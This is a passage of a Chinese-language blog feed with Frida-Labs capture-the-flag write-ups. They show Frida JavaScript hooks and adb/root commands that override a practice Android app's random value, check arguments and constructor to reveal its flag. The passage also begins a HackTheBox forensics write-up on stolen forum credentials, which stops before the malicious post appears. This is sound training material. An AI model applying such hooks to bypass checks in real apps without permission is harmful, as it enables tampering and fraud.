function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">CheckerObj</span>=<span class="hljs-title class_">Checker</span>.$new(<span class="hljs-number">520</span>,<span class="hljs-number">520</span>);<span class="hljs-comment">//直接赋值</span><br><br>instance.<span class="hljs-title function_">flag</span>(<span class="hljs-title class_">CheckerObj</span>);<span class="hljs-comment">// hook Checker 方法</span><br>&#125;,<br><span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;endhook&quot;</span>);<br>&#125;<br>&#125;)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title function_">hook7</span>();<br>&#125;)<br>&#125;<br><br><span class="hljs-built_in">setTimeout</span>(main,<span class="hljs-number">500</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d74a4ac3cfb64e35.png"></p><p>在实例化对象时我直接赋值了，也可以先实例化后赋值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = <span class="hljs-number">520</span>;<br><span class="hljs-keyword">var</span> b = <span class="hljs-number">520</span>;<br><span class="hljs-keyword">var</span> check = checker.$new(a,b);<br>instance.<span class="hljs-title function_">flag</span>(check);<br></code></pre></td></tr></table></figure><h3 id="hook-构造方法"><a href="#hook-构造方法" class="headerlink" title="hook 构造方法"></a>hook 构造方法</h3><p><code>Checker</code> 类中声明了构造方法，所以我们也可以直接 hook 构造方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook7</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Checker</span> =<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);<br><span class="hljs-title class_">Checker</span>.<span class="hljs-property">$init</span>.<span class="hljs-property">implementation</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params">a,b</span>)&#123;<br><span class="hljs-variable language_">this</span>.$init(<span class="hljs-number">520</span>,<span class="hljs-number">520</span>);<br>&#125;<br><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title function_">hook7</span>();<br>&#125;)<br>&#125;<br><br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><h2 id="Conclusion-5"><a href="#Conclusion-5" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Frida Hook 构造方法的模板</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> &lt;class_reference&gt; = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;&lt;package_name&gt;.&lt;class&gt;&quot;</span>);<br>  &lt;class_reference&gt;.<span class="hljs-property">$init</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">&lt;args&gt;</span>)&#123;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    自定义方法实现</span><br><span class="hljs-comment">    */</span><br><br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
      <category>Frida</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Andriod</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我要成为 Frida 糕手:Frida-Labs 0x1</title>
    <link href="/2025/03/27/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E8%A6%81%E6%88%90%E4%B8%BA-Frida-%E7%B3%95%E6%89%8B-Frida-Labs-0x1/"/>
    <url>/2025/03/27/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E8%A6%81%E6%88%90%E4%B8%BA-Frida-%E7%B3%95%E6%89%8B-Frida-Labs-0x1/</url>
    
    <content type="html"><![CDATA[<p>下午看 SWDD 的 <a href="https://blog.shangwendada.top/index.php/2024/03/03/fridafrida%e6%93%8d%e4%bd%9c%e6%89%8b%e5%86%8c/">Frida操作方法总结</a> 文章时被激起兴趣了，所以开干！</p><p>项目地址：<a href="https://github.com/DERE-ad2001/Frida-Labs/tree/main">Frida-Labs</a></p><p>第一个还是很简单的，整体流程：jeb 反编译 -&gt; 简单代码审计 -&gt; hook 关键函数</p><span id="more"></span><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h2><p><code>frida</code> 和 <code>frida-tools</code> 的版本要对应上，不然可能会报错，可以在 <a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a> 找对应版本下载</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">pip list<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/e0aa013913105495.png"></p><h2 id="Frida-server"><a href="#Frida-server" class="headerlink" title="Frida-server"></a>Frida-server</h2><p>启动 frida-server</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stata">adb <span class="hljs-keyword">shell</span><br><span class="hljs-keyword">su</span><br><span class="hljs-keyword">cd</span> data/<span class="hljs-keyword">local</span>/tmp<br><span class="hljs-keyword">ls</span><span class="hljs-comment">// (可有可无)</span><br>chmod 777 frida~<br>./frida~<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/1991be209d3fca01.png"></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>先丢进模拟器看看长什么样</p><p>当什么都不输入值为空时会直接退出程序</p><p>当输入 <code>111</code> 的时候，提示了 【Try again】</p><p><img src="https://img.dkdun.cn/v1/2025/12/07ec56c8242a0e05.png"></p><h2 id="Jeb-反编译"><a href="#Jeb-反编译" class="headerlink" title="Jeb 反编译"></a>Jeb 反编译</h2><p>使用 jeb 反编译后进行代码审计</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ad2001.frida0x1;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.text.TextUtils;<br><span class="hljs-keyword">import</span> android.view.View.OnClickListener;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.EditText;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    TextView t1;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">check</span><span class="hljs-params">(<span class="hljs-type">int</span> v, <span class="hljs-type">int</span> v1)</span> &#123;<br>        <span class="hljs-keyword">if</span>(v * <span class="hljs-number">2</span> + <span class="hljs-number">4</span> == v1) &#123;<br>            Toast.makeText(<span class="hljs-built_in">this</span>.getApplicationContext(), <span class="hljs-string">&quot;Yey you guessed it right&quot;</span>, <span class="hljs-number">1</span>).show();<br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">stringBuilder0</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">v2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; v2 &lt; <span class="hljs-number">20</span>; ++v2) &#123;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">v3</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AMDYV&#123;WVWT_CJJF_0s1&#125;&quot;</span>.charAt(v2);<br>                <span class="hljs-keyword">if</span>(v3 &gt;= <span class="hljs-number">97</span> &amp;&amp; v3 &lt;= <span class="hljs-number">0x7A</span>) &#123;<br>                    v3 = (<span class="hljs-type">char</span>)(v3 - <span class="hljs-number">21</span>);<br>                    <span class="hljs-keyword">if</span>(v3 &lt; <span class="hljs-number">97</span>) &#123;<br>                        v3 = (<span class="hljs-type">char</span>)(v3 + <span class="hljs-number">26</span>);<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(v3 &gt;= <span class="hljs-number">65</span> &amp;&amp; v3 &lt;= <span class="hljs-number">90</span>) &#123;<br>                    v3 = (<span class="hljs-type">char</span>)(v3 - <span class="hljs-number">21</span>);<br>                    <span class="hljs-keyword">if</span>(v3 &lt; <span class="hljs-number">65</span>) &#123;<br>                        v3 = (<span class="hljs-type">char</span>)(v3 + <span class="hljs-number">26</span>);<br>                    &#125;<br>                &#125;<br><br>                stringBuilder0.append(((<span class="hljs-type">char</span>)v3));<br>            &#125;<br><br>            <span class="hljs-built_in">this</span>.t1.setText(stringBuilder0.toString());<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        Toast.makeText(<span class="hljs-built_in">this</span>.getApplicationContext(), <span class="hljs-string">&quot;Try again&quot;</span>, <span class="hljs-number">1</span>).show();<br>    &#125;<br><br>    <span class="hljs-type">int</span> <span class="hljs-title function_">get_random</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">100</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span>  <span class="hljs-comment">// androidx.fragment.app.FragmentActivity</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle bundle0)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(bundle0);<br>        <span class="hljs-built_in">this</span>.setContentView(layout.activity_main);<br>        <span class="hljs-type">EditText</span> <span class="hljs-variable">editText0</span> <span class="hljs-operator">=</span> (EditText)<span class="hljs-built_in">this</span>.findViewById(id.editTextTextPassword);<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">button0</span> <span class="hljs-operator">=</span> (Button)<span class="hljs-built_in">this</span>.findViewById(id.button);<br>        <span class="hljs-built_in">this</span>.t1 = (TextView)<span class="hljs-built_in">this</span>.findViewById(id.textview1);<br>        button0.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span>  <span class="hljs-comment">// android.view.View$OnClickListener</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view0)</span> &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> editText0.getText().toString();<br>                <span class="hljs-keyword">if</span>(TextUtils.isDigitsOnly(s)) &#123;<br>                    <span class="hljs-type">int</span> <span class="hljs-variable">v</span> <span class="hljs-operator">=</span> Integer.parseInt(s);<br>                    MainActivity.<span class="hljs-built_in">this</span>.check(<span class="hljs-built_in">this</span>.get_random(), v);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br><br>                Toast.makeText(MainActivity.<span class="hljs-built_in">this</span>.getApplicationContext(), <span class="hljs-string">&quot;Enter a valid number !!&quot;</span>, <span class="hljs-number">1</span>).show();<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Oncreate-方法"><a href="#Oncreate-方法" class="headerlink" title="Oncreate() 方法"></a>Oncreate() 方法</h2><p>在 <code>onCreate()</code> 方法中添加了一个事件监听器 <code>Button</code>，当被点击的时候会调用 <code>onClick()</code>方法，<code>onClick()</code> 方法中获取输入的文本，验证是否是数字，如果是数字就调用 <code>check()</code> 方法进行验证</p><p><img src="https://img.dkdun.cn/v1/2025/12/dc492a0c288a9b3c.png"></p><h2 id="check-方法"><a href="#check-方法" class="headerlink" title="check() 方法"></a>check() 方法</h2><p><code>get_random()</code> 方法为了找随机数，<code>check()</code> 方法检查输入是否能够满足 <code>v*2 + 4 == v1</code>，如果满足则将 flag 输出</p><p><img src="https://img.dkdun.cn/v1/2025/12/3e8cab3ad35829be.png"></p><p>所以现在明白流程：输入一个数字，如果与随机数符合则输出 flag</p><h1 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h1><h2 id="hook-get-random-方法"><a href="#hook-get-random-方法" class="headerlink" title="hook get_random() 方法"></a>hook get_random() 方法</h2><p>最简单的就是去 hook 这个随机数的值，hook 代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook1</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);<br>    <span class="hljs-title class_">MainActivity</span>.<span class="hljs-property">get_random</span>.<span class="hljs-property">implementation</span>=<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br><br>        <span class="hljs-keyword">var</span> num=<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">get_random</span>();<span class="hljs-comment">// 获取 get_random 值</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;value:&quot;</span>,num); <span class="hljs-comment">//打印</span><br>        <span class="hljs-keyword">return</span> num;<span class="hljs-comment">//返回 hook 的值</span><br>    &#125;;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook1</span>();<br>    &#125;)<br>&#125;<br><br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><p>保存好后运行，因为 <code>get_random()</code> 方法在程序启动时就已经加载完了，所以我们要在它加载之前就注入进去，加上 <code>--no-pause</code> 确保应用启动后不会暂停</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">frida -U -f com.ad2001.frida0x1 -l .\hook1.js --no-<span class="hljs-built_in">pause</span><br></code></pre></td></tr></table></figure><p>返回值为 33，则应该输入 33*2 + 4 &#x3D;70</p><p><img src="https://img.dkdun.cn/v1/2025/12/626386fe438d40b5.png"></p><h2 id="hook-get-random-方法指定值"><a href="#hook-get-random-方法指定值" class="headerlink" title="hook get_random() 方法指定值"></a>hook get_random() 方法指定值</h2><p>hook <code>get_random()</code>方法然后指定随机数的值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook1</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);<br>    <span class="hljs-title class_">MainActivity</span>.<span class="hljs-property">get_random</span>.<span class="hljs-property">implementation</span>=<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">6</span>;<span class="hljs-comment">//指定随机数的值为 6</span><br>    &#125;;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook1</span>();<br>    &#125;)<br>&#125;<br><br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><p>直接输入 16 能得出结果</p><p><img src="https://img.dkdun.cn/v1/2025/12/7a4b9830521d1329.png"></p><h2 id="hook-check-方法"><a href="#hook-check-方法" class="headerlink" title="hook check() 方法"></a>hook check() 方法</h2><p>命令可以不用加上 <code>--no-pause</code>，因为 <code>check()</code> 函数是在程序初始化之后才运行的，不需要在加载时注入了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook1</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);<br>    <span class="hljs-title class_">MainActivity</span>.<span class="hljs-property">check</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;int&#x27;</span>,<span class="hljs-string">&#x27;int&#x27;</span>).<span class="hljs-property">implementation</span>=<span class="hljs-keyword">function</span> (<span class="hljs-params">a,b</span>)&#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">check</span>(a,a*<span class="hljs-number">2</span>+<span class="hljs-number">4</span>);<span class="hljs-comment">//调用原始方法，强制第二个参数为 a*2 +4</span><br>        <span class="hljs-keyword">return</span>;<br>    &#125;;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook1</span>();<br>    &#125;)<br>&#125;<br><br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><p>这个时候随便输入一个范围内的数字都能得出结果</p><p><img src="https://img.dkdun.cn/v1/2025/12/d3ccafd1195e05be.png"></p><p>Challenge 0x1 over ^__^~</p>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
      <category>Frida</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Andriod</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Bumblebee</title>
    <link href="/2025/03/26/HTB-Bumblebee/"/>
    <url>/2025/03/26/HTB-Bumblebee/</url>
    
    <content type="html"><![CDATA[<p>Level：Easy</p><span id="more"></span><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>An external contractor has accessed the internal forum here at Forela via the Guest Wi-Fi, and they appear to have stolen credentials for the administrative user! We have attached some logs from the forum and a full database dump in sqlite3 format to help you in your investigation.</p><h1 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h1><p>查看 <code>access.log</code> ，发现  <code>10.10.0.78</code> 成功登录，往下看发现 <code>10.255.254.2</code> 登录成功并进入了管理页面（<code>adm</code>）。因此猜测<code>10.10.0.78</code> 是承包商，<code>10.255.254.2</code>是真正的管理员</p><p><img src="https://img.dkdun.cn/v1/2025/12/66db6ac120a3b296.png"></p><p>使用在线 <a href="https://sqliteviewer.app/">SQLite 查看器</a> 查看 <code>phpbb.sqlite3</code> 文件，发现有两个用户</p><p><img src="https://img.dkdun.cn/v1/2025/12/eeefa4977b541cb6.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What was <span class="hljs-keyword">the</span> username <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> external contractor?<br>:apoole1<br></code></pre></td></tr></table></figure><h1 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">What IP <span class="hljs-selector-tag">address</span> did the contractor <span class="hljs-selector-tag">use</span> <span class="hljs-selector-tag">to</span> create their account?<br>:<span class="hljs-number">10.10</span>.<span class="hljs-number">0.78</span><br></code></pre></td></tr></table></figure><h1 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h1><p>去 <code>phpbb_posts</code> 里查看 IP <code>10.10.0.78</code> 的 <code>post_id</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/9f6b475ffc45e94c.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> post_id <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> malicious <span class="hljs-built_in">post</span> that <span class="hljs-keyword">the</span> contractor made?<br>:<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><h1 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h1><p>发现 <code>phpbb_posts</code> 还有 <code>post_text</code> 字段</p><p><img src="https://img.dkdun.cn/v1/2025/12/c8849b629884a6dc.png"></p><p>使用 linux 的 sqlite3 查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">pragma table_info(phpbb_users);<br>select post_text from phpbb_posts;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/0d85b6f1704381e5.png"></p><p>发现是网页，整理一下吧</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span 